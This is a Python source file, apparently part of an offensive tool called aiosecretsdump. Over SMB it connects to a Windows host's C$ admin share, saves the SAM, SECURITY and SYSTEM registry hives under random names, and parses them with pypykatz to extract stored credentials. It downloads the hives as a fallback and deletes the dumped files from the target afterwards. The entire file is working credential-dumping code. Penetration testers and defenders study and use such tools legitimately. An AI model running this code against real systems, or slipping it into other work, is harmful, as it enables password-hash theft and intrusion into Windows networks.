
import os
import asyncio
from pathlib import Path

from concurrent.futures import ProcessPoolExecutor

from tqdm import tqdm
from aiosecretsdump import logger
from pypykatz.registry.offline_parser import OffineRegistry
from aiosmb.commons.interfaces.file import SMBFile

async def smb_registry(machine, outfolder = None, show_pbar = False, use_share = 'C$', use_dir = 'temp2'):
	try:
		logger.info('[+] Starting REGDUMP on %s' % machine.connection.target.get_hostname_or_ip())
		logger.info('[+] REGDUMP listing shares...')
		shares = {}
		async for share, err in machine.list_shares():
			if err is not None:
				return False, err

			shares[share.name] = share

		if use_share not in shares:
			return False, Exception('Requested share name %s was not found!' % use_share)
		
		logger.info('[+] REGDUMP creating temp folder on C$...')
		await shares[use_share].connect(machine.connection) #connecting to share
		current_directory = shares[use_share].subdirs['']
		await current_directory.list(machine.connection)

		if use_dir not in current_directory.subdirs:
			logger.info('[!] REGDUMP Requested subdir was not found! Creating it...')
			_, err = await current_directory.create_subdir(use_dir, machine.connection)
			if err is not None:
				logger.info('[-] REGDUMP Failed to create requested directory "%s" Reason: %s' % (use_dir, str(err)))
				return err

			await current_directory.list(machine.connection)

		bpath = '%s:\\%s' % (use_share[0], use_dir)
		uncbp = '\\%s\\%s' % (use_share, use_dir)
		samh = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
		sech = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
		sysh = '%s.%s' % (os.urandom(8).hex(), os.urandom(2).hex()[:3])
		reshname = {
			'SAM' : '%s\\%s' % (bpath, samh),
			'SAM_unc' : '%s\\%s' % (uncbp, samh),
			'SECURITY' : '%s\\%s' % (bpath, sech),
			'SECURITY_unc' : '%s\\%s' % (uncbp, sech),
			'SYSTEM' : '%s\\%s' % (bpath, sysh),
			'SYSTEM_unc' : '%s\\%s' % (uncbp, sysh),
		}
		for hive_name in ['SAM', 'SECURITY', 'SYSTEM']:
			logger.info('[+] REGDUMP Dumping %s hive to remote path' % hive_name)
			_, err = await machine.save_registry_hive(hive_name, reshname[hive_name])
			if err is not None:
				logger.info('[-] Failed to dump %s hive' % hive_name)
				return False, err

		await asyncio.sleep(5) # sleeping for a bit because the files might not have been written to the remote disk yet
		logger.info('[+] REGDUMP Dumping part complete, now parsing the files!')
		
		po, err = await parse_regfiles(machine, reshname['SAM_unc'], reshname['SYSTEM_unc'], reshname['SECURITY_unc'])
		if err is not None:
			logger.error('[-] REGDUMP Failed to parse the registry hive files remotely!')
			if outfolder is None:
				logger.info('[+] REGDUMP no output folder specified, skipping downloading unparsable registry hives!')
				return False, None
			logger.info('[+] REGDUMP Downloading registry files as failsafe')
			
			for uname in ['SAM_unc', 'SECURITY_unc', 'SYSTEM_unc']:
				file_name = uname.split('_')[0] + '.reg'
				file_obj = SMBFile.from_remotepath(machine.connection, reshname[uname])
				try:
					with tqdm(desc = 'Downloading %s' % file_name, total=file_obj.size, unit='B', unit_scale=True, unit_divisor=1024) as pbar:
						with open(outfolder.joinpath(file_name), 'wb') as outfile:
							async for data, err in machine.get_file_data(file_obj):
								if err is not None:
									raise err
								if data is None:
									break
								outfile.write(data)
								pbar.update(len(data))
				
				except Exception as e:
					logger.error('[-] REGDUMP failed to retrieve %s' % file_name)
				finally:
					await file_obj.close()

				logger.info('[+] REGDUMP Sucsessfully downloaded %s' % file_name)

		else:
			if outfolder is None:
				print(str(po))
			else:
				with open(outfolder.joinpath('results.txt'), 'w') as f:
					f.write(str(po))

		return True, None
	except Exception as e:
		return False, e

	finally:
		logger.info('[+] REGDUMP Removing hive files from remote system')
		for uname in ['SAM_unc', 'SECURITY_unc', 'SYSTEM_unc']:
			_, err = await SMBFile.delete_unc(machine.connection, reshname[uname])
			if err is not None:
				logger.warning('[+] REGDUMP Failed to clear up hive file %s' % reshname[uname])

		logger.info('[+] REGDUMP on %s finished!' % machine.connection.target.get_hostname_or_ip())




async def wmi_registry(machine):
	pass

async def powershell_registry(machine):
	pass




#### internal functions! all methods should use parse_regfiles for on-the-fly parsing
def parse_regfiles_blocking(sam_file, system_file, security_file, sam_unc, system_unc, security_unc):
	try:
		system_file.open(system_unc, 'rb')
		sam_file.open(sam_unc, 'rb')
		security_file.open(security_unc, 'rb')

		po = OffineRegistry.from_files(system_file, sam_path = sam_file, security_path = security_file, notfile = True)
		return po, None
	except Exception as e:
		return None, e

async def parse_regfiles(machine, sam_unc, system_unc, security_unc):
	try:
		system_file = machine.get_blocking_file()
		sam_file = machine.get_blocking_file()
		security_file = machine.get_blocking_file()

		loop = asyncio.get_event_loop()

		with ProcessPoolExecutor() as process_executor:
			coro = loop.run_in_executor(process_executor, parse_regfiles_blocking, sam_file, system_file, security_file, sam_unc, system_unc, security_unc)
			po, err = await coro
			
			if err is not None:
				return None, err

		return po, None

	except Exception as e:
		return False, e